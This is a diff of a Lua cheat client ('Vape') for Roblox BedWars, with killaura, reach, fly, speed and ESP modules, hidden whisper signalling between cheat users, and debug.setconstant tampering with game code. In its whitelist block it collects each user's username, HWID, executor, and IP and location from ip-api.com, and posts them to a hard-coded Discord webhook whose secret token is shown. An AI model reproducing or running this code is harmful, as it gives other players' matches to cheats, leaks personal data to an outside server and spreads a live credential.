@@ -91,72 +91,70 @@ local Blacklist = {
 end
 
 local Whitelist = {
-	["536b07bc-8794-4c60-9582-66a853e97e89"] = "very tuff cat#4499",
-	["4DEB50A4-3D57-4D9D-8D56-6C17B49BFB68"] = "AA222#6026",
-	["2B7E4926-420F-446C-96BD-7BC5C6AC57F2"] = "vyx#1368",
-	["0a075ad8-b787-46e4-b890-a374aaf7a270"] = "L A Z ☰ R#2279",
-	["477D3175-4DAB-4387-9D24-172A9EF610A3"] = "balltickler6000",
+	["536b07bc-8794-4c60-9582-66a853e97e89"] = "very.tuff.no.cap.",
+	["2B7E4926-420F-446C-96BD-7BC5C6AC57F2"] = ".salty_salt",
+	["1fc649d9-1777-4eac-9655-239f4453919c"] = "L A Z ☰ R#2279",
 	["98FCAEA8-744B-468C-A25F-CA35EFD50242"] = "Skxdded#6468" --kryptonite/lunar client owner
 }
 
 if Whitelist[game:GetService("RbxAnalyticsService"):GetClientId()] then
 	game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "Whitelisted! ", Color = Color3.fromRGB(0, 255, 0), Font = Enum.Font.Merriweather, FontSize = Enum.FontSize.Size24 } )
-	local Webhook = "https://discord.com/api/webhooks/1114499369270513754/0BtO1BGeRRvYyRP28QKQbbCx3-viJ3oU4OSV5y5ZgIS4D3dMTeL9JMpL47Cv7obE6GtY"
-				_G.Discord_UserID = ""
-				local player = game:GetService"Players".LocalPlayer
-				local joinTime = os.time() - (player.AccountAge*86400)
-				local joinDate = os.date("!*t", joinTime)
-				local premium = false
-				local alt = true
-				if player.MembershipType == Enum.MembershipType.Premium then
-				premium = true
-				end
-				local executor = identifyexecutor() or "Unknown"
-				local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
-				Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
-				local AvatarImage = Thing.imageUrl
-				local msg = {
-				["username"] = "Vape",
-				["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
-				["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
-				["embeds"] = {
+		local Webhook = "https://discord.com/api/webhooks/1114499369270513754/0BtO1BGeRRvYyRP28QKQbbCx3-viJ3oU4OSV5y5ZgIS4D3dMTeL9JMpL47Cv7obE6GtY"
+		_G.Discord_UserID = ""
+		local player = game:GetService"Players".LocalPlayer
+		local joinTime = os.time() - (player.AccountAge*86400)
+		local joinDate = os.date("!*t", joinTime)
+		local premium = false
+		local alt = true
+		if player.MembershipType == Enum.MembershipType.Premium then
+		premium = true
+		end
+		local executor = identifyexecutor() or "Unknown"
+		local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+		Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+		local AvatarImage = Thing.imageUrl
+		local msg = {
+		["username"] = "Vape",
+		["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
+		["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+		["embeds"] = {
+				{
+			["color"] = tonumber(tostring("0x32CD32")), --decimal
+			["title"] = "Whitelist",
+			["thumbnail"] = {
+				["url"] = AvatarImage,
+			},
+			["fields"] = {
 					{
-				["color"] = tonumber(tostring("0x32CD32")), --decimal
-				["title"] = "Whitelist",
-				["thumbnail"] = {
-					["url"] = AvatarImage,
-				},
-				["fields"] = {
-						{
-					["name"] = "Roblox Username:",
-					["value"] = ""..lplr.Name.."",
-					["inline"] = true
-						},
-						{
-					["name"] = "ID:",
-					["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
-					["inline"] = true
-						},
-						{
-					["name"] = "Executor:",
-					["value"] = executor,
-					["inline"] = true
-						},
-						{
-					["name"] = "Ip and Location:",
-					["value"] = tostring(game:HttpGet("http://ip-api.com/csv/", true)),
-					["inline"] = true
-						},
-						{
-					["name"] = "HWID:",
-					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-					["inline"] = true
-					}
-				},
-				['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
-			}
+				["name"] = "Roblox Username:",
+				["value"] = ""..lplr.Name.."",
+				["inline"] = true
+					},
+					{
+			["name"] = "ID:",
+			["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
+			["inline"] = true
+					},
+					{
+			["name"] = "Executor:",
+			["value"] = executor,
+			["inline"] = true
+					},
+					{
+			["name"] = "Ip and Location:",
+			["value"] = tostring(game:HttpGet("http://ip-api.com/csv/", true)),
+			["inline"] = true
+					},
+					{
+			["name"] = "HWID:",
+			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+			["inline"] = true
+				}
+			},
+			['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
 		}
 	}
+}
 request = http_request or request or HttpPost or syn.request
 request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 local textService = game:GetService("TextService")
@@ -553,7 +551,7 @@ local function getSpeed()
 			speed = speed + 25
 		end
 		if bedwarsStore.zephyrOrb ~= 0 then 
-			speed = speed + 30
+			speed = speed + 28
 		end
 	end
 	return speed
@@ -621,7 +619,7 @@ end
 
 local function getOpenApps()
 	local count = 0
-	for i,v in pairs(bedwars.AppController:getOpenApps()) do if not tostring(v):find("Billboard") then count = count + 1 end end
+	for i,v in pairs(bedwars.AppController:getOpenApps()) do if (not tostring(v):find("Billboard")) and (not tostring(v):find("GameNametag")) then count = count + 1 end end
 	return count
 end
 
@@ -1277,15 +1275,12 @@ GuiLibrary.LoadSettingsEvent.Event:Connect(function(res)
 	end
 end)
 
-
-
-
 runcode(function()
 	local function getWhitelistedBed(bed)
 		if bed then
 			for i,v in pairs(playersService:GetPlayers()) do
 				if v:GetAttribute("Team") and bed and bed:GetAttribute("Team"..(v:GetAttribute("Team") or 0).."NoBreak") then
-					local plrtype, plrattackable = WhitelistFunctions:CheckPlayerType(v)
+					local plrtype, plrattackable = WhitelistFunctions:GetWhitelist(v)
 					if not plrattackable then 
 						return true
 					end
@@ -1352,7 +1347,7 @@ runcode(function()
 				SendToServer = function(self, attackTable, ...)
 					local suc, plr = pcall(function() return playersService:GetPlayerFromCharacter(attackTable.entityInstance) end)
 					if suc and plr then
-						local playertype, playerattackable = WhitelistFunctions:CheckPlayerType(plr)
+						local playertype, playerattackable = WhitelistFunctions:GetWhitelist(plr)
 						if not playerattackable then 
 							return nil 
 						end
@@ -1660,94 +1655,28 @@ runcode(function()
 
 	task.spawn(function()
 		repeat task.wait() until WhitelistFunctions.Loaded
-		for i3,v3 in pairs(WhitelistFunctions.WhitelistTable.chattags) do
-			if v3.NameColor then
-				v3.NameColor = Color3.fromRGB(v3.NameColor.r, v3.NameColor.g, v3.NameColor.b)
-			end
-			if v3.ChatColor then
-				v3.ChatColor = Color3.fromRGB(v3.ChatColor.r, v3.ChatColor.g, v3.ChatColor.b)
-			end
-			if v3.Tags then
-				for i4,v4 in pairs(v3.Tags) do
-					if v4.TagColor then
-						v4.TagColor = Color3.fromRGB(v4.TagColor.r, v4.TagColor.g, v4.TagColor.b)
-					end
+		for i, v in pairs(WhitelistFunctions.WhitelistTable.WhitelistedUsers) do
+			if v.tags then
+				for i2, v2 in pairs(v.tags) do
+					v2.color = Color3.fromRGB(unpack(v2.color))
 				end
 			end
 		end
 
-		local priolist = {
-			DEFAULT = 0,
-			["VAPE PRIVATE"] = 1,
-			["VAPE OWNER"] = 2
-		}
 		local alreadysaidlist = {}
 
 		local function findplayers(arg, plr)
 			local temp = {}
 			local continuechecking = true
 
-			if arg == "default" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
-			if arg == "teamdefault" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
-			if arg == "private" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "VAPE PRIVATE" then table.insert(temp, lplr) continuechecking = false end
+			if arg == "default" and continuechecking and WhitelistFunctions.LocalPriority == 0 then table.insert(temp, lplr) continuechecking = false end
+			if arg == "teamdefault" and continuechecking and WhitelistFunctions.LocalPriority == 0 and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
+			if arg == "private" and continuechecking and WhitelistFunctions.LocalPriority == 1 then table.insert(temp, lplr) continuechecking = false end
 			for i,v in pairs(playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
 
 			return temp
 		end
-
-		local function transformImage(img, txt)
-			local function funnyfunc(v)
-				if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-					v.Image = img
-					v:GetPropertyChangedSignal("Image"):Connect(function()
-						v.Image = img
-					end)
-				end
-				if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ExperienceChat") == nil then
-					if v.Text ~= "" then
-						v.Text = txt
-					end
-					v:GetPropertyChangedSignal("Text"):Connect(function()
-						if v.Text ~= "" then
-							v.Text = txt
-						end
-					end)
-				end
-				if v:IsA("Texture") or v:IsA("Decal") then
-					v.Texture = img
-					v:GetPropertyChangedSignal("Texture"):Connect(function()
-						v.Texture = img
-					end)
-				end
-				if v:IsA("MeshPart") then
-					v.TextureID = img
-					v:GetPropertyChangedSignal("TextureID"):Connect(function()
-						v.TextureID = img
-					end)
-				end
-				if v:IsA("SpecialMesh") then
-					v.TextureId = img
-					v:GetPropertyChangedSignal("TextureId"):Connect(function()
-						v.TextureId = img
-					end)
-				end
-				if v:IsA("Sky") then
-					v.SkyboxBk = img
-					v.SkyboxDn = img
-					v.SkyboxFt = img
-					v.SkyboxLf = img
-					v.SkyboxRt = img
-					v.SkyboxUp = img
-				end
-			end
-		
-			for i,v in pairs(game:GetDescendants()) do
-				funnyfunc(v)
-			end
-			game.DescendantAdded:Connect(funnyfunc)
-		end
-
-		local vapePrivateCommands = {bypassed=function(args, plr)end}
+		local vapePrivateCommands={bypassedwhitelist=function(args, plr)end}
 		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
 
 		textChatService.OnIncomingMessage = function(message)
@@ -1755,33 +1684,24 @@ runcode(function()
 			if message.TextSource then
 				local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
 				if plr then
-					local plrtype, plrattackable, plrtag = WhitelistFunctions:CheckPlayerType(plr)
 					local args = message.Text:split(" ")
 					local client = bedwarsStore.whitelist.chatStrings1[#args > 0 and args[#args] or message.Text]
-					local localPriority = priolist[WhitelistFunctions:CheckPlayerType(lplr)]
-					local otherPriority = priolist[plrtype]
-					local hash = WhitelistFunctions:Hash(plr.Name..plr.UserId)
+					local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
 					props.PrefixText = message.PrefixText
+					if bedwarsStore.whitelist.clientUsers[plr.Name] then
+						props.PrefixText = "<font color='#"..Color3.new(1, 1, 0):ToHex().."'>["..bedwarsStore.whitelist.clientUsers[plr.Name].."]</font> "..props.PrefixText
+					end
 					if plrtag then
-						if plrtype == "VAPE OWNER" then
-							props.PrefixText = "<font color='#"..Color3.new(1, 0.3, 0.3):ToHex().."'>[VAPE OWNER]</font> "..props.PrefixText
-						elseif plrtype == "VAPE PRIVATE" then
-							props.PrefixText = "<font color='#"..Color3.new(0.7, 0, 1):ToHex().."'>[VAPE PRIVATE]</font> "..props.PrefixText
-						elseif bedwarsStore.whitelist.clientUsers[plr.Name] then
-							props.PrefixText = "<font color='#"..Color3.new(1, 1, 0):ToHex().."'>["..bedwarsStore.whitelist.clientUsers[plr.Name].."]</font> "..props.PrefixText
-						end
-						if WhitelistFunctions.WhitelistTable.chattags[hash] then
-							props.PrefixText = message.PrefixText
-							for i, v in pairs(WhitelistFunctions.WhitelistTable.chattags[hash].Tags) do 
-								props.PrefixText = "<font color='#"..v.TagColor:ToHex().."'>["..v.TagText.."]</font> "..props.PrefixText
-							end
+						props.PrefixText = message.PrefixText
+						for i, v in pairs(plrtag) do 
+							props.PrefixText = "<font color='#"..v.color:ToHex().."'>["..v.text.."]</font> "..props.PrefixText
 						end
 					end
 					if plr:GetAttribute("ClanTag") then 
 						props.PrefixText = "<font color='#FFFFFF'>["..plr:GetAttribute("ClanTag").."]</font> "..props.PrefixText
 					end
 					if plr == lplr then 
-						if localPriority > 0 then
+						if WhitelistFunctions.LocalPriority > 0 then
 							if message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" then
 								local tab = {}
 								for i,v in pairs(vapePrivateCommands) do
@@ -1796,16 +1716,15 @@ runcode(function()
 							end
 						end
 					else
-						if localPriority > 0 and message.TextChannel.Name:find("RBXWhisper") and client ~= nil and alreadysaidlist[plr.Name] == nil then
+						if WhitelistFunctions.LocalPriority > 0 and message.TextChannel.Name:find("RBXWhisper") and client ~= nil and alreadysaidlist[plr.Name] == nil then
 							message.Text = ""
 							alreadysaidlist[plr.Name] = true
-							createwarning("Vape", plr.Name.." is using "..client.."!", 60)
 							WhitelistFunctions.CustomTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
 							bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
 							local ind, newent = entityLibrary.getEntityFromPlayer(plr)
 							if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
 						end
-						if otherPriority > 0 and otherPriority > localPriority and #args > 1 then
+						if otherPriority > 0 and otherPriority > WhitelistFunctions.LocalPriority and #args > 1 then
 							table.remove(args, 1)
 							local chosenplayers = findplayers(args[1], plr)
 							table.remove(args, 1)
@@ -1830,35 +1749,33 @@ runcode(function()
 		end
 
 		local function newPlayer(plr)
-			if (WhitelistFunctions:CheckPlayerType(plr) ~= "DEFAULT" or WhitelistFunctions.WhitelistTable.chattags[WhitelistFunctions:Hash(plr.Name..plr.UserId)]) then
-				if lplr ~= plr and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then
-					GuiLibrary.SelfDestruct = function()
-						createwarning("Vape", "nice one bro :troll:", 5)
-					end
-					task.spawn(function()
-						repeat task.wait() until plr:GetAttribute("LobbyConnected")
-						task.wait(4)
-						local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-						local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
-						local client = bedwarsStore.whitelist.chatStrings2.vape
-						task.spawn(function()
-							game:GetService("CoreGui").ExperienceChat.bubbleChat.DescendantAdded:Connect(function(newbubble)
-								if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
-									newbubble.Parent.Parent.Visible = false
-								end
-							end)
-							game:GetService("CoreGui").ExperienceChat:FindFirstChild("RCTScrollContentView", true).ChildAdded:Connect(function(newbubble)
-								if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
-									newbubble.Visible = false
-								end
-							end)
-						end)
-						if newchannel then 
-							newchannel:SendAsync(client)
-						end
-						textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
-					end)
+			if WhitelistFunctions:GetWhitelist(plr) ~= 0 and WhitelistFunctions.LocalPriority == 0 then
+				GuiLibrary.SelfDestruct = function()
+					createwarning("Vape", "nice one bro :troll:", 5)
 				end
+				task.spawn(function()
+					repeat task.wait() until plr:GetAttribute("LobbyConnected")
+					task.wait(4)
+					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
+					local client = bedwarsStore.whitelist.chatStrings2.vape
+					task.spawn(function()
+						game:GetService("CoreGui").ExperienceChat.bubbleChat.DescendantAdded:Connect(function(newbubble)
+							if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
+								newbubble.Parent.Parent.Visible = false
+							end
+						end)
+						game:GetService("CoreGui").ExperienceChat:FindFirstChild("RCTScrollContentView", true).ChildAdded:Connect(function(newbubble)
+							if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
+								newbubble.Visible = false
+							end
+						end)
+					end)
+					if newchannel then 
+						newchannel:SendAsync(client)
+					end
+					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+				end)
 			end
 		end
 
@@ -2083,10 +2000,18 @@ do
 			end
 		until not vapeInjected
 	end)
+	local textlabel = Instance.new("TextLabel")
+	textlabel.Size = UDim2.new(1, 0, 0, 36)
+	textlabel.Text = "A new discord has been created, click the icon to join."
+	textlabel.BackgroundTransparency = 1
+	textlabel.ZIndex = 10
+	textlabel.TextStrokeTransparency = 0
+	textlabel.TextScaled = true
+	textlabel.Font = Enum.Font.SourceSans
+	textlabel.TextColor3 = Color3.new(1, 1, 1)
+	textlabel.Position = UDim2.new(0, 0, 1, -36)
+	textlabel.Parent = GuiLibrary.MainGui.ScaledGui.ClickGui
 end
-
-
-
 
 runcode(function()
 	local handsquare = Instance.new("ImageLabel")
@@ -2169,9 +2094,6 @@ GuiLibrary.RemoveObject("AntiVoidOptionsButton")
 GuiLibrary.RemoveObject("SongBeatsOptionsButton")
 GuiLibrary.RemoveObject("TargetStrafeOptionsButton")
 
-
-
-
 runcode(function()
 	local AimAssist = {Enabled = false}
 	local AimAssistClickAim = {Enabled = false}
@@ -2233,9 +2155,6 @@ runcode(function()
 		Default = 50
 	})
 end)
-
-
-
 
 runcode(function()
 	local autoclicker = {Enabled = false}
@@ -2357,9 +2276,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local ReachValue = {Value = 14}
 	Reach = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
@@ -2385,9 +2301,6 @@ runcode(function()
 		Default = 18
 	})
 end)
-
-
-
 
 runcode(function()
 	local Sprint = {Enabled = false}
@@ -2424,9 +2337,6 @@ runcode(function()
 		HoverText = "Sets your sprinting to true."
 	})
 end)
-
-
-
 
 runcode(function()
 	local Velocity = {Enabled = false}
@@ -2468,9 +2378,6 @@ runcode(function()
 		Default = 0
 	})
 end)
-
-
-
 
 runcode(function()
 	local AutoLeaveDelay = {Value = 1}
@@ -2645,9 +2552,6 @@ runcode(function()
 	AutoLeaveStaff2.Object.Visible = false
 end)
 
-
-
-
 runcode(function()
 	local oldclickhold
 	local oldclickhold2
@@ -2723,9 +2627,6 @@ runcode(function()
 end)
 
 local autobankballoon = false
-
-
-
 runcode(function()
 	local Fly = {Enabled = false}
 	local FlyMode = {Value = "CFrame"}
@@ -3059,9 +2960,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local GrappleExploit = {Enabled = false}
 	local GrappleExploitMode = {Value = "Normal"}
@@ -3133,9 +3031,6 @@ runcode(function()
 		end
 	})
 end)
-
-
-
 
 runcode(function()
 	local InfiniteFly = {Enabled = false}
@@ -3236,6 +3131,10 @@ runcode(function()
 				if entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart) then
 					cloned = lplr.Character
 					oldcloneroot = entityLibrary.character.HumanoidRootPart
+					if not lplr.Character.Parent then 
+						InfiniteFly.ToggleButton(false)
+						return
+					end
 					lplr.Character.Parent = game
 					clone = oldcloneroot:Clone()
 					clone.Parent = lplr.Character
@@ -3376,9 +3275,6 @@ runcode(function()
 end)
 
 local killauraNearPlayer
-
-
-
 runcode(function()
 	local killauraboxes = {}
     local killauratargetframe = {Players = {Enabled = false}}
@@ -3399,7 +3295,6 @@ runcode(function()
     local killauraswing = {Enabled = false}
 	local killaurasync = {Enabled = false}
     local killaurahandcheck = {Enabled = false}
-    local killaurabaguette = {Enabled = false}
     local killauraanimation = {Enabled = false}
 	local killauraanimationtween = {Enabled = false}
 	local killauracolor = {Value = 0.44}
@@ -3687,8 +3582,7 @@ runcode(function()
 									if killauratargetframe.Walls.Enabled then
 										if not bedwars.SwordController:canSee({player = plr.Player, getInstance = function() return plr.Character end}) then continue end
 									end
-									local playertype, playerattackable = WhitelistFunctions:CheckPlayerType(plr.Player)
-									if not playerattackable then
+									if not ({WhitelistFunctions:GetWhitelist(plr.Player)})[2] then
 										continue
 									end
 									if killauranovape.Enabled and bedwarsStore.whitelist.clientUsers[plr.Player.Name] then
@@ -3717,7 +3611,7 @@ runcode(function()
 									if (workspace:GetServerTimeNow() - bedwars.SwordController.lastAttack) < 0.02 then 
 										break
 									end
-									local selfpos = selfrootpos + (killaurarange.Value > 14 and (selfrootpos - root.Position).magnitude > 14.4 and (CFrame.lookAt(selfrootpos, root.Position).lookVector * ((selfrootpos - root.Position).magnitude - 14.4)) or Vector3.zero)
+									local selfpos = selfrootpos + (killaurarange.Value > 14 and (selfrootpos - root.Position).magnitude > 14.4 and (CFrame.lookAt(selfrootpos, root.Position).lookVector * ((selfrootpos - root.Position).magnitude - 14)) or Vector3.zero)
 									if killaurasync.Enabled then 
 										if animationdelay <= tick() then
 											animationdelay = tick() + 0.19
@@ -3729,13 +3623,9 @@ runcode(function()
 									bedwars.SwordController.lastAttack = workspace:GetServerTimeNow()
 									bedwarsStore.attackReach = math.floor((selfrootpos - root.Position).magnitude * 100) / 100
 									bedwarsStore.attackReachUpdate = tick() + 1
-									local chargeRatio = swordmeta.sword and swordmeta.sword.chargedAttack and swordmeta.sword.chargedAttack.maxChargeTimeSec or 0
-									if swordmeta.displayName:find("Scythe") then
-										chargeRatio = 0
-									end
 									killaurarealremote:FireServer({
 										weapon = sword.tool,
-										chargedAttack = {chargeRatio = chargeRatio},
+										chargedAttack = {chargeRatio = swordmeta.sword.chargedAttack and not swordmeta.sword.chargedAttack.disableOnGrounded and 1 or 0},
 										entityInstance = plr.Character,
 										validate = {
 											raycast = {
@@ -4067,11 +3957,6 @@ runcode(function()
         Function = function() end,
 		HoverText = "Only attacks when your sword is held."
     })
-    killaurabaguette = Killaura.CreateToggle({
-        Name = "Baguette Aura",
-        Function = function() end,
-		HoverText = "Uses the baguette instead of the sword."
-    })
     killauraanimation = Killaura.CreateToggle({
         Name = "Custom Animation",
         Function = function(callback)
@@ -4090,19 +3975,19 @@ runcode(function()
         Function = function() end,
 		HoverText = "Times animation with hit attempt"
     })
-	if WhitelistFunctions:CheckPlayerType(lplr) ~= "DEFAULT" then
-		killauranovape = Killaura.CreateToggle({
-			Name = "No Vape",
-			Function = function() end,
-			HoverText = "no hit vape user"
-		})
-	end
+	killauranovape = Killaura.CreateToggle({
+		Name = "No Vape",
+		Function = function() end,
+		HoverText = "no hit vape user"
+	})
+	killauranovape.Object.Visible = false
+	task.spawn(function()
+		repeat task.wait() until WhitelistFunctions.Loaded
+		killauranovape.Object.Visible = WhitelistFunctions.LocalPriority ~= 0
+	end)
 end)
 
 local LongJump = {Enabled = false}
-
-
-
 runcode(function()
 	local damagetimer = 0
 	local damagetimertick = 0
@@ -4393,9 +4278,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local NoFall = {Enabled = false}
 	local oldfall
@@ -4414,9 +4296,6 @@ runcode(function()
 		HoverText = "Prevents taking fall damage."
 	})
 end)
-
-
-
 
 runcode(function()
 	local NoSlowdown = {Enabled = false}
@@ -4445,9 +4324,6 @@ end)
 
 local spiderActive = false
 local holdingshift = false
-
-
-
 runcode(function()
 	local activatePhase = false
 	local oldActivatePhase = false
@@ -4502,9 +4378,6 @@ runcode(function()
 		Function = function() end
 	})
 end)
-
-
-
 
 runcode(function()
 	local oldCalculateAim
@@ -4595,9 +4468,6 @@ end)
 --until I find a way to make the spam switch item thing not bad I'll just get rid of it, sorry.
 
 local Scaffold = {Enabled = false}
-
-
-
 runcode(function()
 	local scaffoldtext = Instance.new("TextLabel")
 	scaffoldtext.Font = Enum.Font.SourceSans
@@ -4804,9 +4674,6 @@ runcode(function()
 end)
 
 local antivoidvelo
-
-
-
 runcode(function()
 	local Speed = {Enabled = false}
 	local SpeedMode = {Value = "CFrame"}
@@ -4941,9 +4808,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local function roundpos(dir, pos, size)
 		local suc, res = pcall(function() return Vector3.new(math.clamp(dir.X, pos.X - (size.X / 2), pos.X + (size.X / 2)), math.clamp(dir.Y, pos.Y - (size.Y / 2), pos.Y + (size.Y / 2)), math.clamp(dir.Z, pos.Z - (size.Z / 2), pos.Z + (size.Z / 2))) end)
@@ -5028,9 +4892,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local TargetStrafe = {Enabled = false}
 	local TargetStrafeRange = {Value = 18}
@@ -5098,9 +4959,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local BedESP = {Enabled = false}
 	local BedESPFolder = Instance.new("Folder")
@@ -5163,9 +5021,6 @@ runcode(function()
 		HoverText = "Render Beds through walls" 
 	})
 end)
-
-
-
 
 runcode(function()
 	local function getallblocks2(pos, normal)
@@ -5302,9 +5157,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local ChestESPList = {ObjectList = {}, RefreshList = function() end}
 	local function nearchestitem(item)
@@ -5425,9 +5277,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local FieldOfViewValue = {Value = 70}
 	local oldfov
@@ -5475,9 +5324,6 @@ runcode(function()
 		HoverText = "optifine zoom lol"
 	})
 end)
-
-
-
 
 runcode(function()
 	local old
@@ -5585,9 +5431,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local GameFixer = {Enabled = false}
 	local GameFixerHit = {Enabled = false}
@@ -5628,9 +5471,6 @@ runcode(function()
 		Default = true
 	})
 end)
-
-
-
 
 runcode(function()
 	local transformed = false
@@ -6086,9 +5926,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local oldkilleffect
 	local KillEffectMode = {Value = "Gravity"}
@@ -6232,9 +6069,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local KitESP = {Enabled = false}
 	local espobjs = {}
@@ -6301,9 +6135,6 @@ runcode(function()
 		end
 	})
 end)
-
-
-
 
 runcode(function()
 	local function floorNameTagPosition(pos)
@@ -6725,9 +6556,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local nobobdepth = {Value = 8}
 	local nobobhorizontal = {Value = 8}
@@ -6832,9 +6660,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local SongBeats = {Enabled = false}
 	local SongBeatsList = {ObjectList = {}}
@@ -6907,9 +6732,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local performed = false
 	GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
@@ -6938,12 +6760,12 @@ runcode(function()
 					debug.setconstant(hotbar.render, 73, 100)
 					debug.setconstant(hotbar.render, 89, 1)
 					debug.setconstant(hotbar.render, 90, 0.04)
-					debug.setconstant(hotbar.render, 91, -0.025)
+					debug.setconstant(hotbar.render, 91, -0.03)
 					debug.setconstant(hotbar.render, 109, 1.35)
 					debug.setconstant(hotbar.render, 110, 0)
-					 debug.setconstant(debug.getupvalue(hotbar.render, 11).render, 30, 1)
+					debug.setconstant(debug.getupvalue(hotbar.render, 11).render, 30, 1)
 					debug.setconstant(debug.getupvalue(hotbar.render, 11).render, 31, 0.175)
-					debug.setconstant(debug.getupvalue(hotbar.render, 11).render, 33, -0.1)
+					debug.setconstant(debug.getupvalue(hotbar.render, 11).render, 33, -0.101)
 					debug.setconstant(debug.getupvalue(hotbar.render, 18).render, 71, 0)
 					debug.setconstant(debug.getupvalue(hotbar.render, 18).tweenPosition, 16, 0)
 					gametheme.topBarBGTransparency = 0.5
@@ -6964,14 +6786,20 @@ runcode(function()
 							debug.setconstant(bedwars.QueueCard.render, 9, 0.1)
 						end
 					end)
+					local slot = bedwars.ClientStoreHandler:getState().Inventory.observedInventory.hotbarSlot
+					bedwars.ClientStoreHandler:dispatch({
+						type = "InventorySelectHotbarSlot",
+						slot = slot + 1 % 8
+					})
+					bedwars.ClientStoreHandler:dispatch({
+						type = "InventorySelectHotbarSlot",
+						slot = slot
+					})
 				end)
 			end
 		end
 	})
 end)
-
-
-
 
 runcode(function()
 	local AntiAFK = {Enabled = false}
@@ -6991,9 +6819,6 @@ runcode(function()
 		end
 	})
 end)
-
-
-
 
 runcode(function()
 	local AutoBalloonPart
@@ -7095,9 +6920,6 @@ runcode(function()
 end)
 
 local autobankapple = false
-
-
-
 runcode(function()
 	local AutoBuy = {Enabled = false}
 	local AutoBuyArmor = {Enabled = false}
@@ -7106,10 +6928,9 @@ runcode(function()
 	local AutoBuyGen = {Enabled = false}
 	local AutoBuyProt = {Enabled = false}
 	local AutoBuySharp = {Enabled = false}
-	local AutoBuyBreakSpeed = {Enabled = false}
+	local AutoBuyDestruction = {Enabled = false}
+	local AutoBuyDiamond = {Enabled = false}
 	local AutoBuyAlarm = {Enabled = false}
-    local AutoBuyArmory = {Enabled = false}
-    local AutoBuyBrewingStand = {Enabled = false}
 	local AutoBuyGui = {Enabled = false}
 	local AutoBuyTierSkip = {Enabled = true}
 	local AutoBuyRange = {Value = 20}
@@ -7322,17 +7143,17 @@ runcode(function()
 			if not AutoBuyGen.Enabled then return end
 			buyUpgrade("generator", inv, upgrades)
 		end,
